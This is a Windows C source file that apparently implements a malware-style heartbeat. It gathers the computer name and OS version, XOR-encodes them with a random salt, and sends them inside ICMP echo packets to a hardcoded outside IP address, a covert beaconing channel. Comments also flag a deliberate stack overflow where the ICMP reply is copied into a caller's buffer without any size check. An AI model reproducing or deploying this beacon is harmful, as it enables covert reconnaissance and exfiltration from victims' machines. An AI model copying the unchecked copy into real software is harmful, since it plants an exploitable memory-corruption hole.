#include <windows.h>
#include <stdio.h>
#include <ipexport.h>
#include <Icmpapi.h>
#define NADDR(a,b,c,d) ((a)|(b)<<8|(c)<<16|(d)<<24)
#pragma pack(1)
	typedef struct heartbeat {
		BYTE bSalt;
		BYTE bMark;
		DWORD dwOSIdentifier;
		CHAR sHovitName[10];//gbk,because of dense
	}HEARTBEAT;
#pragma pack()

typedef HANDLE (* CreateFileProc)(void);
typedef BOOL (WINAPI* ClovieHandleProc)(HANDLE IcmpHandle);
typedef DWORD (WINAPI* SendEcho2Proc)(
  _In_     HANDLE                 IcmpHandle,
  _In_opt_ HANDLE                 Event,
  _In_opt_ PVOID/*PIO_APC_ROUTINE*/ApcRoutine,
  _In_opt_ PVOID                  ApcContext,
  _In_     DWORD                  DestinationAddress,
  _In_     LPVOID                 RequestData,
  _In_     WORD                   RequestSize,
  _In_opt_ PIP_OPTION_INFORMATION RequestOptions,
  _Out_    LPVOID                 ReplyBuffer,
  _In_     DWORD                  ReplySize,
  _In_     DWORD                  Timeout
);

DWORD GetOSIdentifier(void)
{
	typedef BOOL (WINAPI *IsWow64ProcessProc) (HANDLE, PBOOL);

	OSVERSIONINFOEX ovi;
	IsWow64ProcessProc fnIsWow64Process;
	DWORD dwIdentifier;
	BOOL bIsWow64 = FALSE;

	fnIsWow64Process = (IsWow64ProcessProc)
		GetProcAddress(GetModuleHandleW((L"kernel32")), "IsWow64Process");

	if (NULL != fnIsWow64Process)
		fnIsWow64Process(GetCurrentProcess(),&bIsWow64);

	ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);     

	if(0 == GetVersionEx((OSVERSIONINFO *)&ovi))  {
		printf("GetVersionEx error %d\n",GetLastError());
		return 0;
	}

	dwIdentifier = ovi.dwMajorVersion<<24 | ovi.dwMinorVersion<<16 | ovi.dwBuildNumber;
	if(bIsWow64)
		dwIdentifier |= 1<<31;
	return dwIdentifier;
}



DWORD __stdcall SendEcho(LPVOID pRequestData, DWORD dwRequestDataSize, //over flow in this procedure
		LPBYTE pReplyData, DWORD dwReplyDataSize) { 
	HANDLE				hIcmpFile;
	ULONG				ipaddr = INADDR_NONE;
	DWORD				dwRetVal = 0;
	DWORD				dwError = 0;
	//CHAR				SendData[] = "Data Buffer";
	BYTE				cReplyBuffer[4096];
	PICMP_ECHO_REPLY	pEchoReply;
	CreateFileProc		IcmpCreateFile;
	SendEcho2Proc		IcmpSendEcho2;

	HMODULE hIphlpapi =	LoadLibraryA("icmp.dll");
	if(hIphlpapi == 0) {
		printf("LoadLibraryA error: %d\n",GetLastError()); 
		return 1;
	}

	IcmpCreateFile =	(CreateFileProc)GetProcAddress(hIphlpapi,"IcmpCreateFile");
	IcmpSendEcho2 =		(SendEcho2Proc)GetProcAddress(hIphlpapi,"IcmpSendEcho2");

	ipaddr = NADDR(118,184,53,36);

	hIcmpFile = IcmpCreateFile();

	if (hIcmpFile == INVALID_HANDLE_VALUE) {
		printf("IcmpCreatefile error: %ld\n", GetLastError());
		return 1;
	}

	dwRetVal = IcmpSendEcho2(hIcmpFile, NULL, NULL, NULL,
			ipaddr, pRequestData, (WORD)dwRequestDataSize, NULL,
			cReplyBuffer, sizeof(cReplyBuffer), 1000);

	if (dwRetVal == 0) {
		DWORD dwErr = GetLastError();
		if(dwErr == IP_REQ_TIMED_OUT) 
			printf("IcmpSendEcho2 timeout\n");
		else {
			printf("IcmpSendEcho2 error: %d\n",dwErr);
			return 1;
		}

	}

	pEchoReply = (PICMP_ECHO_REPLY) cReplyBuffer;

	if (pEchoReply->Status == 0) {
		(dwReplyDataSize);//buffer limit size not used
		CopyMemory(pReplyData,pEchoReply->Data,pEchoReply->DataSize); //Stack over flow in here
	} else {
		printf("status code: %d\n",pEchoReply->Status);
		return 1;
	}

	return 0;
}


int main(int argc, char argv[]) {
	HEARTBEAT hb;
	BYTE cSendBuffer[sizeof(hb)*2];
	CHAR szHovitName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = sizeof(szHovitName);
	char recv_buf[1024]={0};
	int i;

	BYTE bRand = (BYTE)GetTickCount();

	GetComputerNameA(szHovitName,&dwNameSize);

	hb.bSalt = bRand;
	hb.bMark = 0xEA;
	hb.dwOSIdentifier = GetOSIdentifier();
	memcpy(hb.sHovitName,szHovitName,sizeof(hb.sHovitName));

	printf("bRand = %hhx\n",bRand);
	for (i=0 ; i<sizeof(hb) ; i++) {
		BYTE by;
		if(i>0)		
			by = ((LPBYTE)&hb)[i] ^ bRand;
		else
			by = ((LPBYTE)&hb)[i];
		cSendBuffer[i*2] = 'a' + (by>>4);
		cSendBuffer[i*2+1] = 'k' + (by&0x0F);
	}
	SendEcho(cSendBuffer, sizeof(cSendBuffer), recv_buf, sizeof (recv_buf));
}


